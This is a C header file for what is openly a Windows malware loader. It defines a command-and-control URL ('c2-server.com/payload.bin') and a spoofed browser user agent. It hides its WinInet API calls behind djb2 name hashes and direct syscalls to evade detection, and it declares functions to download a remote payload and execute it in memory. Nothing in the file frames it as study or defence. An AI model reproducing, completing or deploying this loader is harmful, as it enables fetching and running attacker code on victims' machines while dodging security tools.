#ifndef CORE_H
#define CORE_H

#include <windows.h>
#include <wininet.h>
#include "syscall.h"

#define INTERNET_FLAG_RELOAD 0x80000000
#define INTERNET_OPEN_TYPE_PRECONFIG 0
#define C2_URL "http://c2-server.com/payload.bin"
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);

typedef enum _SECTION_INHERIT {
    ViewShare=1,
    ViewUnmap=2
} SECTION_INHERIT, *PSECTION_INHERIT;

DWORD hash_IntOpen = 0xF4AD70A1;        // djb2 for "InternetOpenA"
DWORD hash_IntOpenUrl = 0x8F5CA3B4;     // djb2 for "InternetOpenUrlA"
DWORD hash_IntReadFile = 0xFB4F8EAA;    // djb2 for "InternetReadFile"
DWORD hash_IntClose = 0x4241BEF0;       // djb2 for "InternetCloseHandle"

void InitUnicodeString(PUNICODE_STRING pUnicodeString, PCWSTR pwszString);
PVOID load_dll_in_mem(PCWSTR dll_path_string);
char* download_payload(SIZE_T* payload_size);
BOOL execute_payload(char* payload, SIZE_T payload_size);

#endif